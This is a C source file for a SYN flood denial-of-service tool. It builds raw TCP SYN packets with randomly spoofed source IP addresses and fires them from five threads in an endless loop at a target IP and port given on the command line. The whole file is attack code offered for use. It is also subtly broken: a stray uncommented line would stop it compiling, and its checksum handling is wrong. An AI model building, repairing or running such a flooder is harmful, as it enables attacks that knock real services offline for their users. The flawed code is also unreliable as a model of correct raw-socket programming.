#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <pthread.h>
#include "header.h"

char *dest_ip;
int dest_port;

void *send_synflood(void *tmp){
    int* fd=tmp;

    char packet[65536];
    memset(packet, 0, 65536);

    //IP header pointer
    struct iphdr *iph = (struct iphdr *)packet;

    //TCP header pointer
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_udp_header psh; //pseudo header 
    
    struct sockaddr_in to;
    to.sin_family = AF_INET;
    to.sin_port = htons(dest_port);
    to.sin_addr.s_addr = inet_addr(dest_ip);
    
    
    //fill the IP header here
    iph->version=4;
    iph->ihl=5;
    iph->tos=0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(0);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = 6;
    iph->check = checksum((unsigned short*)packet, sizeof(struct iphdr)+sizeof(struct tcphdr));
    iph->daddr=inet_addr(dest_ip);
    tcph->source = htons(rand()%5000 + 1000);
    tcph->dest = htons(dest_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff=5;
    tcph->syn=1;
    tcph->window = htons(4096);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    psh.source_address = iph->saddr;
                
    psh.dest_address = inet_addr(dest_ip);
    psh.placeholder = 0;
    psh.protocol = 6;
    psh.udp_length = htons(sizeof(struct tcphdr));

    char *ps = malloc(sizeof(struct pseudo_udp_header)+sizeof(struct tcphdr));
    memcpy(ps,(char*)&psh, sizeof(struct pseudo_udp_header));
    memcpy(ps+sizeof(struct pseudo_udp_header),tcph,sizeof(struct tcphdr));
    tcph->check = checksum((unsigned short*)ps, sizeof(struct pseudo_udp_header)+sizeof(struct tcphdr));
    free(ps);   
    
    while(1) {
    	// randomly generate the ip adress
        char source_ip[32];
        source_ip[0] = '\0';
        char buffer[4];
        sprintf(buffer, "%d", rand() % 256);
        strcat(source_ip, buffer);
        strcat(source_ip, ".");
        sprintf(buffer, "%d", rand() % 256);
        strcat(source_ip, buffer);
        strcat(source_ip, ".");
        sprintf(buffer, "%d", rand() % 256);
        strcat(source_ip, buffer);
        strcat(source_ip, ".");
        sprintf(buffer, "%d", rand() % 256);
        strcat(source_ip, buffer);
        iph->saddr=inet_addr(source_ip);

        send the packet
        if(sendto(*fd, packet, iph->tot_len, 0, (struct sockaddr *)&to, sizeof(to))<0){
            printf("Sending error");
        }
        else {
            printf("Sended to %s:%d\n",dest_ip,dest_port);
        }
    }
    
}


int main(int argc, char *argv[])
{   
    dest_ip = argv[1];
    dest_port = atoi(argv[2]);

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        int hincl = 1;                  /* 1 = on, 0 = off */
        setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    if(fd < 0)
    {
        perror("Error creating raw socket ");
        exit(1);
    }
    
    pthread_t pthread[5];
    for(int n=0;n<5;n++) pthread_create(&pthread[n], NULL, send_synflood, &fd);
    for(int n=0;n<5;n++) pthread_join(pthread[n], NULL);
    return 0;
}